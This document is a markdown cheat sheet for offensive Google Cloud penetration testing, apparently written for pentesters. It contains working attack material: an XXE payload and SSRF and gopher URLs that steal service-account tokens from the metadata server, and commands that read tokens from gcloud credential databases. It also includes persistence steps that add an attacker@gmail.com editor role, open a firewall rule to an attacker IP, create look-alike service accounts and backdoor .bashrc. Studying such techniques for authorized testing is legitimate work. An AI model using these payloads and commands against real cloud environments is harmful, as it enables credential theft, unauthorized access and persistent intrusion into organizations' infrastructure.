# GCP Pentest : Tools and Techniques

### MITRE Att&ck : Cloud Matrix
- https://attack.mitre.org/matrices/enterprise/cloud/

### GCP - 101
Google Cloud Platform resource hierarchy.
- https://cloud.google.com/resource-manager/docs/cloud-platform-resource-hierarchy

```
Organization
--> Folders
  --> Projects
    --> Resources
```

### Organization
> The Organization resource is the root node in the Google Cloud resource hierarchy and is the hierarchical super node of projects.

### Folders
> Folders are nodes in the Cloud Platform Resource Hierarchy. A folder can contain projects, other folders, or a combination of both. Organizations can use folders to group projects under the organization node in a hierarchy.

### Project
> A GCP Project is basically a collection of various GCP services such as compute instances, storage buckets, Cloud run containers, etc. that are grouped together since they serve one application or project in the corporate terminology.

<img src="https://cloud.google.com/resource-manager/img/cloud-hierarchy.svg" alt="gcphierarchy" width="500"/>

### GCP Control Plane
GCP control plane can be defined as a set o APIs that allows a GCP administrator or an IAM user to start, monitor and stop various services that run within GCP environment.  

### Secrets to GCP Control Plane
#### Owner (username/password)
This is the first account used to sign up for GCP.
--> Root level credential, owner credential for the GCP project

#### GCP IAM user
GCP Identity and Access Management (IAM) allows to create unique IAM user identities. IAM accounts are restricted by default in terms of the privileges they are provided with.

#### Service account
Special type of Google account intended to represent a non-human user that need to authenticate and be authorized to access data in Google APIs.  

--> **Service account key files** : JSON files containing the private key of the service account. Used by application to access various other GCP resources.

#### OAuth 2.0 Client credentials
In some case we would not use service account but user credentials to access resources on behalf of an end user for example, in this case we will use OAuth 2.0 client credentials.  

--> A client token will be obtained after the user grants permissions and this allows an application to access project resources under that user's account. ([OAuth Token Hijacking](https://www.youtube.com/watch?v=motZouxkVZ0))

#### API Keys
API keys are simple encrypted strings that can be used when calling certain APIs that don't need to access private user data.   

API Key are mostly used to track API requests associated with the project for quota and billing.

**Threat regarding GCP**  
- Owner account
- IAM credentials
- Service account key files

3 Types of IAM roles:
- Basic Roles : Existing roles prior to the introduction of IAM
	+ Owner
	+ Editor
	+ Viewer

- Predefined Roles : Granular access for specific service
	+ [Created by Google](https://cloud.google.com/iam/docs/understanding-roles#predefined_roles)

- Custom Roles : Ganular access to user-specified list of permissions.

**Checking permissions**
- [IAM permissions](https://cloud.google.com/iam/docs/permissions-reference)
- [Predefined roles](https://cloud.google.com/iam/docs/understanding-roles#predefined_roles)
- [Product specific IAM roles](https://cloud.google.com/iam/docs/understanding-roles#product_specific_documentation)

### GCP Access
#### Web console
- https://console.cloud.google.com  
--> Management UI (classical admin console interface with GUI accessible through browser)

#### Gcloud CLI
- https://cloud.google.com/sdk/docs/cheatsheet
--> Google Cloud CLI is a set of tools to create and manage Google Cloud resources.

Through click on the web console or gcloud CLI you will directly talk to Controle Plan APIs (Restfull).

### Obtaining User Access Tokens

As mentionned previously 2 types of accounts exist within GCP :
- User accounts (user credentials)
- Service accounts (service account credentials)

Secret in user credentials files takes the form of a long-lived **refresh tokens** .   
--> You usually obtain (authorized) user credential files by through the underlying command, which initiates an **[OAuth 2.0 authorization code grant](https://www.oauth.com/oauth2-servers/server-side-apps/authorization-code/#:~:text=The%20authorization%20code%20is%20a,exchange%20for%20an%20access%20token.&text=This%20also%20means%20the%20access,token%20leaking%20to%20someone%20else.)**.

```
gcloud auth application-default login
```

--> This will produce a credential file called : **application_default_credentials.json**  
--> Located at : **~/.config/gcloud**  

<img src="./Images/application_default_credentials.png" alt="gcphierarchy" width="700"/>

This **refresh token** can be used to obain access tokens using **[OAuth 2.0 refresh token grant](https://oauth.net/2/grant-types/refresh-token/)**  

As an attacker some actions or tools required an **access tokens** to operate. In fact the **refresh token grant** action only requires a single call to retrieve a valid **access token**.

```
curl --location --request POST "https://oauth2.googleapis.com/token" --header "Content-Type: application/json" --data-raw "{
       'client_id': 'XXXXXXXXXX-XXXXXXXXXXXX.apps.googleusercontent.com',
       'client_secret': 'X-XXXXXXXXXXXXXXXX',
       'refresh_token': 'XXXXXXXXXXXXXXXXXXXXXXXXXX',
       'grant_type': 'refresh_token'
     }"

```
--> The response is an access token and an ID token.

**Note 1** : You can modify the access token scopes by specifying scopes in your request, although you cannot increase beyond the scopes of the original refresh token.  

**Note 2** : The scope ending *cloud-platform* gives you access to pretty much all GCP resources.  


### Obtaining Service Account Access Tokens

GCP Service Accounts [documentation](https://cloud.google.com/compute/docs/access/service-accounts).  

Service account credential files are JSON files containing **private key**.    This private key is generated from GCP Console or using Gcloud cli.  

These key can be used to obtain **access tokens**. The private key is stored within service account credential files
```
{
  "type": "service_account",
  "project_id": "project-id",
  "private_key_id": "**redacted**",
  "private_key": "-----BEGIN PRIVATE KEY-----\n**redacted**\n-----END PRIVATE KEY-----\n",
  "client_email": "service-account-name@project-id.iam.gserviceaccount.com",
  "client_id": "**redacted**",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/service-account-name%40project-id.iam.gserviceaccount.com"
}
```

In order to obtain access tokens for service account, most of the time attacker will exploit the metadata service directly and retrieve the access tokens.

```
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

You can also directly authentify yourself using the service account credential JSON file.  
```
gcloud auth activate-service-account --project=<YOUR GCLOUD PROJECT> --key-file=<SERVICE ACCOUNT FILE>
```

## GCP - Analysis
### Scoutsuite

### Hayat
- https://github.com/DenizParlak/hayat

Hayat is a auditing & hardening script for Google Cloud Platform services such as:

- Identity & Access Management
- Logging and monitoring
- Networking
- Virtual Machines
- Storage
- Cloud SQL Instances
- Kubernetes Clusters

### GCP-IAM-Collector
Python scripts for collecting and visualising Google Cloud Platform IAM permissions.  

GCP IAM graph is created using vis.js and it's static HTML page, see example interactive graph.  

- https://github.com/marcin-kolda/gcp-iam-collector

### GCP Firewall enum
Parse gcloud output to enumerate compute instances with network ports exposed to the Internet.


- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_firewall_enum

### GCP_enum
A simple bash script to enumerate Google Cloud Platform environments. The script utilizes gcloud, gsutil, and curl commands to collect information from various GCP APIs. The commands will use the current "Application Default Credentials".  

- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_enum

### GCP K8s enum
This tool analyzes the output of several gcloud commands to determine services exposed to the public Internet via Google Kubernetes Engine (GKE) Ingress.  

- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_k8s_enum


## GCP – Enumeration / Recon

### Open buckets / CloudRun / Functions
- https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/gcp_misc.git

### GCP - Azure - AWS IP ranges
Python script performing the necessary actions for collecting the latest IP addresses used by Amazon Web Services, Google Compute, and Microsoft Azure.  

- https://github.com/chrismaddalena/UsefulScripts/blob/master/UpdateCloudIPs.py

### Shodan / Censys
Look for strings within Shodan related to GCP environments:
- storage.gogole.apis.com
-

### GCP Dorks
- Identifying GCE instances that might have JSON file:
```
site:bc.googleusercontent.com ext:json intext:url
```
--> If a website is hosted in this GCE, add the IP before **bc**.
```
https://33.xx.xx.xx.bc.googleusercontent.com/
```
--> Automated technique:
SearchDiggity (Credits to : BishopFox)
- https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/

<img src="https://resources.bishopfox.com/wp-content/uploads/2013/07/SearchDiggity-ToolList-29May2014v2.png" alt="firebasedorks" width="500"/>


- Identifying GCP Storage.
	- https://bucket_name.storage.googleapis.com
	- https://storage.googleapis.com/bucket_name

```
site:storage.googleapis.com

```
--> Automated technique: [GCPBucketBrute](https://github.com/lutzenfried/OffensiveCloud/blob/main/GCP/GCP%20Pentest%20Cloud%20-%20Resources.md#gcp--gcpbucketbrute)

- Identifying App Engine
```
site:appsport.com inurl:admin ext:html
```

- Identifying Cloud run
```
site:run.app inurl:admin
```

- Identifying Cloud FireStore (NoSQL database)
```
site:firebaseio.com inurl:admin
```
<img src="./Images/dork_firebase.png" alt="firebasedorks" width="500"/>

- Identifying Cloud Functions
```
site:cloudfunctions.net inurl:admin
```
- Identifying potential SSRF
```
site:appspot.com ext:php inurl:url=
```

#### Dorks automation techniques:  
1. SearchDiggity
- https://resources.bishopfox.com/resources/tools/google-hacking-diggity/attack-tools/  


2. Dork-cli
- https://github.com/jgor/dork-cli

In order to use this program you need to configure at a minimum two settings: a Google API key and a custom search engine id.

### GCP Storage - GreyHatWarfare
Finding GCP Storage resources such as buckets:
- https://buckets.grayhatwarfare.com/

### GCP Storage misc locations
- Github, other repo technology to find storage endpoint
- Mobile app of the company
- Wayback machine (enum_wayback module MSF)

### Accessing Onjects
- https://storage.googleapis.com/its_all_in_the_cloud/object001.jpg
	- storage.googleapis.com -> GCP
	- its_all_in_the_cloud -> Globally unique bucket name
	- object001.jpg -> Object Name

### Git / Repo secret parsers
Public Repository Search for Credentials/Access Keys/Configuration Files  
```
- [gitleaks] (https://github.com/zricethezav/gitleaks)
- [trufflehog] (https://github.com/trufflesecurity/truffleHog)
- [git-secrets] (https://github.com/awslabs/git-secrets)
- [shhgit] (https://github.com/eth0izzle/shhgit)
- [gitrob](https://github.com/michenriksen/gitrob)
- [Token Hunter](https://gitlab.com/gitlab-com/gl-security/security-operations/gl-redteam/token-hunter)
```

--> Within Github search for the following terms in company profile :
- storage.googleapis.com

### Cloud_Enum
Tool to search for public resources in AWS, Azure, and GCP

- https://github.com/initstring/cloud_enum

```
python3 cloud_enum.py -k <name-to-search>
```

## GCP - Authenticated enumeration
### Cloud Service Enum
This script allows pentesters to validate which cloud tokens (API keys, OAuth tokens and more) can access which cloud service.  

- https://github.com/NotSoSecure/cloud-service-enum/
- https://notsosecure.com/cloud-services-enumeration-aws-azure-and-gcp

### User - data access
In case of web application or instance compromise it is possible to access instance meta-data, but also to access **user data**.
--> These data are specified when we launch our instance, e.g. Simple script to specify parameters to configure a MySQL database on the instance.



## GCP - Exploitation

### OAuth Phishing (Illicit Grant Attack)
illicit grant attacks use the actual OAuth authentication/authorization flows in order to obtain the OAuth session tokens. This has the advantage of bypassing MFA authentication, with permanent or nearly indefinite access since the OAuth tokens can be continually refreshed in most cases using **refresh token**  

- https://www.youtube.com/watch?v=motZouxkVZ0

<img src="./Images/oauth_flow.png" alt="firebasedorks" width="800"/>


### Exploiting shared images

### GCP : GCPBucketBrute
Google Storage buckets, determine what access you have to them, and determine if they can be privilege escalated.  

- https://github.com/RhinoSecurityLabs/GCPBucketBrute

This tool can be used using unauthenticated/authenticated approach.

If credentials --> the majority of enumeration will still be performed while unauthenticated, but for any bucket that is discovered via unauthenticated enumeration, it will attempt to enumerate the bucket permissions using the TestIamPermissions API with the supplied credentials.

```
python3 gcpbucketbrute.py -k companyName -u

```

### Brute force file within bucket
If the bucket is configured correctly and file listing is not possible, that does not mean the files are protected correctly within the bucket. It is possible that the owner of the bucket forgot to set the permissions on sensitive files uploaded to that bucket.

- Use [enumFilesStorage.py](https://github.com/lutzenfried/OffensiveCloud/blob/main/GCP/Scripts/enumFilesStorage.py)

```
# Usage : python3 enumeFilesStorage.py bucketName threadNumber
# python3 enumFilesStorage.py cdn_test 16

Not Found : index.php
Not Found : search.php
Not Found : login.php
============> Valid file found : a.log
Not Found : cron.php
Not Found : LICENSE.txt
Not Found : INSTALL.pgsql.txt
Not Found : register.php
Not Found : memberlist.php
Not Found : UPGRADE.txt
```

### Subdomain takeover
Subdomain takeover can occur within GCP environment. For example through bucket and DNS entry misconfiguration.  

In case a DNS entry still points to the subdomain to that GCP bucket, but the bucket has been deleted, an attacker woul be able to **create** a new bucket with the same name under hist attacker's GCP account.

This would provide capability to attacker to create malicious JavaScript, or served any content using victim organization identity.  

```
e.g. foo.example.com ---DNS--entry--(CNAME)---> foo.storage.googleapis.com
```
#### Subdomain takeover technic
1. Enumerating subdomain and maps where subdomain point to.
- https://github.com/nahamsec/HostileSubBruteforcer
- https://github.com/aboul3la/Sublist3r
- Certificate transparency https://crt.sh/?q=company.com
- httpstatus.io to verify status code

2. In case it points to deleted GCP bucket : **No Such Bucket**
--> Reserve a bucket within your GCP environment with the same name.

<img src="./Images/nosuchbucket.png" alt="cookies" width="500"/>

### GCP : XML External Entity (XXE)
Retrieve instance metadata service account token using XXE vulnerability

```
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json">]>

```

### GCP : Server Side Request Forgery (SSRF)
v1 and v1beta1 depecation : https://cloud.google.com/compute/docs/deprecations/v0.1-v1beta1-metadata-server

--> v1beta1 deprecated but sometimes works.

- metadata.google.internal : 169.254.169.254
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

- Beta does NOT require a header atm (but normally deprecated)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

- Use gopher SSRF to add the required headers
- Metadata-Flavor: Google
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

#### Accessing interesting files
- **SSH Public Key** : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
- **Get Access Token** : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
- **Kubernetes Key** : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=jso

#### SSRF Exploitation scenario:
1. Extract the token
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

2. Check the scope of the token
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{
        "issued_to": "101302079XXXXX",
        "audience": "10130207XXXXX",
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
        "expires_in": 2443,
        "access_type": "offline"
}
```

3. Now push the SSH key
```
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

### Validate a User Tokens
Query the Google API to validate and  determine token scope.
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ywgfhdb3dyx-xj0_EofjsfFks53kdDF
```
- [gcp_check_token.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_check_token.py)
- [gcp_get_token_gce_header.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_header.py)
- [gcp_get_token_gce_v1beta1.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_v1beta1.py)
Check access token is valid and it's scope via googleapis.com

### Exploiting Kubernetes (K8s-GKE)
**Scenario** : You exploit a webapp and get command execution.  

### Validate you are in container env
Check for environment variables for *kupepods* process
```
/bin/cat /proc/1/cgroup
```

If Docker in use, check for *.dockerenv* at /
```
ls -lah /
```

Check process list on the box (pid 1 is not **init** or **launchd**)
```
ps -aux

```

### Accessing secrets
By default, a container in the Kubernetes cluster will hold a service account token within its file system. If attackers find that token, they can use it to move laterally, or depending on the privilege of the service account, they can escalate its privilege to compromise the entire cluster environment.  
```
/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/token
```

Access token via metadata from compromised nodes.
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

## GCP - Lateral movement / pivoting
### SharpCloud
SharpCloud is a simple C# utility for checking for the existence of credential files related to Amazon Web Services, Microsoft Azure, and Google Compute.

#### Searches all user profiles for credentials related to Google Compute.
```
SharpCloud.exe gcloud
```

- https://github.com/chrismaddalena/SharpCloud

### From compromised node
If access to a container, a compromised pode can talk to the kubelet on ports:
- TCP 10250
- TCP 10255

--> Checking if port are accessible: E.g for port 10250  
```
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex(('192.168.0.10',10250))
if result == 0:
	print ("Port is open")
else:
	print ("Port is not open")
sock.close()
```

--> Listing pods
```
import urllib

response = urllib.urlopen('http://10.128.0.10:10255/pods')
print("Response : ", response)
print("URL : ", response.geturl())

headers = response.info()
print (headers)

data = response.read()
print (data^)
```

### Container Breakout
If you land on a container that is not configured with default settings, you may need to escalate your privileges or escape from it in order to gain access to the underlying host OS.

- Docker Breakout (HackTricks)
- Container Escape Using Kernel Exploitation (CyberArk)
- How I Hacked Play-with-Docker (CyberArk)
- CVE-2016-5195
- CVE-2019–5736
- CVE-2019–14271
- CVE-2020–15257

### Services Accounts - Lateral movement
In case of service account compromise you can try to impersonate another service account to launch command within the context of another service account and attempt to move laterally or obtain further informations.

--> This requires a special “**Service Account Token Creator Owner**” IAM role (roles/iam.serviceAccountTokenCreator) assigned currently logged-in service account.  

Listing services accounts
```
gcloud iam service-accounts list
```

Impersonate other service account and different commands in the context of that account
```
gcloud compute instances list --impersonate-service-account storage@service-test-001-iam.gserviceaccount.com
gsutil -i storage@service-test-001-iam.gserviceaccount.com ls
```

You can also add the impersonation configuration directly to avoid retyping the --impersonate-service-account parameter.
```
gcloud config set auth/impersonate_service_account storage@service-test-001-iam.gserviceaccount.com
gsutil ls
```

Finally you can use the token and impersonate service account to request the service account access token.
```
gcloud auth print-access-token --impersonate-service-account storage@service-test-001-iam.gserviceaccount.com
```

### From CLI to GCP management console
It is possible if the correct permissions are enable, to add your GMAIL account to the GCP project management console.  

Permissions required: **[roles/iam.securityAdmin](https://cloud.google.com/iam/docs/understanding-roles)**

```
gcloud projects add-iam-policy-binding project-name-000001 --member user:eviluser@gmail.com --role roles/editor
```
--> Try to login with controlled @gmail.com mail account to the management console.  

### Access Scopes
The service account on a GCP Compute Instance will use OAuth to communicate with the Google Cloud APIs. When access scopes are used, the OAuth token that is generated for the instance will have a scope limitation included.  

--> This **does not define** the actual permissions.  

You can see what scopes are assigned by querying the metadata URL.  

```
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
https://www.googleapis.com/auth/servicecontrol
https://www.googleapis.com/auth/service.management.readonly
https://www.googleapis.com/auth/trace.append
```

If an instance has no scope limitation you will received the following result:  
```
https://www.googleapis.com/auth/cloud-platform
```
--> This scope will allow us to authenticate to any API function and leverage the full power of our assigned IAM permissions.  

### Application Default Credentials
As an alternative to first pulling a token from the metadata server, Google also has a strategy called Application Default Credentials. When using one of Google's official GCP client libraries, the code will automatically go searching for credentials to use in a defined order.  

1. First check in source code itself
2. Next is the env variable **GOOGLE_APPLICATION_CREDENTIALS** (point to a service account key file)
3. Finnaly it will use the default token provided by the metadata server as described in the [section above](#access-scopes)

## GCP - Privilege Escalation

### Follow the Scripts
In case of compute instance compromise, most of the time you can assume this instance is deployed to realized  a specific task or action within the GCP environment, you can also assume that in order to realize its task it needs some permissions/access to other GCP resources (storage, crypto keys or other instances).  

Depending on the permission it is possible that a simple ```gsutil ls``` does not return anything..  
--> Representing that the service account is lacking the **storage.buckets.list** IAM permission.  

**BUT** running running ```gsutil ls gs://instance82736-long-term-script-data``` could give you access to data and additional credentials.  

- Of course brute forcing is a good idea to verify if you can access/list specific bucket
- In case of randomized bucket name such as above **instance82736-long-term-script-data** brute forcing is not an option.

To find specific buckets name, instance name or crypto keys where service account of this instance could have access, you can check the followings:  

Look for references to the gcloud command in scripts within:  
- The instance's metadata local filesystem
- Service unit files, etc.

--> You may also find Python, Ruby, PHP, etc scripts using their own GCP client libraries that leverage the service account's permissions to get things done.

### Modifying instance Metadata
If you can modify the instance's metadata. You can try to escalate your privileges locally.  
**2** scenarios are possible : **Default Service Account** and **Custom Service Account**.  

##### Default Service Account
- Allow default access (default)
- Allow full access to all Cloud APIs
- Set access for each API


### GCP CloudBuild
A user with permissions to start a new build with Cloud Build can gain access to the Cloud Build Service Account and abuse it for more access to the environment.  

To exploit this as a user in GCP, we only need one IAM permission granted to the user in question:  

- cloudbuild.builds.create

--> https://rhinosecuritylabs.com/gcp/iam-privilege-escalation-gcp-cloudbuild/
--> https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py

### Privilege escalation using Non-IAM
https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/
## GCP - Persistence
### Accessing tokens
In case you compromise a laptop, Mac, or server with Gcloud CLI installed.  

GCP tokens are stored within an SQL Lite database.  

- MAC Accessing tokens
```
ls /Users/bryce/.config/gcloud/access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
- Linux Accessing tokens
```
ls /home/jdoe/.config/gcloud/access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
- Windows Accessing tokens
```
dir C:\Users\username\AppData\Roaming\gcloud\access_tokens.db

sqlite3 access_tokens.db "select * from access_tokens"
```
Additionnally you can access Scope every token using **credentials.db** database.
```
sqlite3 credentials.db "select * from credentials
```
### Browser Cookies
--> **If Root Access**-> Export (Safari,Chrome,Firefox,etc...)

- Mitre Att&ck technique - [T1539](https://attack.mitre.org/techniques/T1539/) - Steal Web Session Cookie
- Mitre Att&ck technique - [T1550](https://attack.mitre.org/techniques/T1550/) - Sub-Technique [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/)

- https://embracethered.com/blog/posts/passthecookie/
- https://maxchadwick.xyz/blog/exporting-your-browser-cookies-on-a-mac/

--> **No Root Access**
- https://github.com/defaultnamehere/cookie_crimes

<img src="./Images/cookie_browser.png" alt="cookies" width="600"/>

### Cloud Shell Persistence
Using Cloud Shell online, the machine comes pre-installed with the Google Cloud SDK but also with **5GB** HOME directory which will **persist** across sessions.

--> Backdoor the **.bashrc** file

### Firewall rules persistence
Objective : Persistent connection to a GCP resource such as a compute engine.  

The following example represent an SQL injection resulting in RCE in one of the internal applications hosted on compute instance. This instance is only accessible from corporate internal network.

--> As an attacker we will allow our attacker IP address to connect to that instance on port 443.

```
gcloud compute firewall-rules list
gcloud compute firewall-rules create "tcp-rule" --allow tcp:443 --source-range="167.xx.xx.xx" --description="443 TCP traffic"
gcloud compute firewall-rules delete tcp-rule
```

### Service Account persistence
Creating a service account similar to an existing one.  
```
gcloud iam service-accounts create almost-legitimate-account --display-name "legit account hack"
gcloud iam service-accounts list
gcloud iam service-accounts keys create --iam-account "almost-legitimate-account@test-project-1234.iam.gserviceaccount.com" key.json
cat key.json
```

### IAM user add persistence
Adding attacker/owned GMAIL address to the project list with **Editor** role.

```
gcloud projects add-iam-policy-binding test-project-1234 --member="attacker@gmail.com" --role="roles/editor"
gcloud auth login
gcloud projects list
```

## GCP - Resources

### GCP - Security - HackTricks
- https://book.hacktricks.xyz/cloud-security/gcp-security

### GCP - Pentestbook
- https://pentestbook.six2dez.com/enumeration/cloud/gcp

### Privilege escalation and post-exploitation in GCP
- https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/

### Hacking GCP - Richard Knowell
- https://www.amazon.ca/Advanced-Penetration-Testing-Hacking-Platform/dp/B08P1H4KLZ

### Security Bugs in Google Cloud Platform (LiveOverflow)
- https://www.youtube.com/watch?v=J2icGMocQds
- https://www.youtube.com/watch?v=g-JgA1hvJzA

### GCP Pentest Notes
- https://infosecwriteups.com/pentest-notes-google-cloud-edition-2e138bb0f504
- https://medium.com/@tomaszwybraniec/google-cloud-platform-pentest-notes-service-accounts-b960dc59d93a

### Oauth authorization/device flow
- https://www.netskope.com/fr/blog/new-phishing-attacks-exploiting-oauth-authorization-flows-part-1

### GCP Application default credentials
- https://medium.com/datamindedbe/application-default-credentials-477879e31cb5

### Training - Vulnerable Cloud environments
- Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat
- SadCloud - https://github.com/nccgroup/sadcloud
- Flaws Cloud - http://flaws.cloud
- Thunder CTF - http://thunder-ctf.cloud
